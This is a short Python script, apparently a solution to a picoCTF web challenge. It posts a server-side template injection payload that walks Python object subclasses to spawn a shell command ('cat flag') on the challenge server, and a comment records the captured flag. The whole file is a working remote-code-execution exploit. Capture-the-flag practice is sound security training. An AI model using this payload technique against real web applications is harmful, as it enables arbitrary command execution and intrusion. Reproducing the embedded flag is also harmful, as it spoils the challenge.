import requests

url = "http://rescued-float.picoctf.net:50351/announce"

payload = "{{1.__class__.__mro__[1].__subclasses__()[356]('cat flag',shell=True,stdout=-1).communicate()[0]}}"

resp = requests.post(url, data={"content": payload})
print(resp.text)

# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}
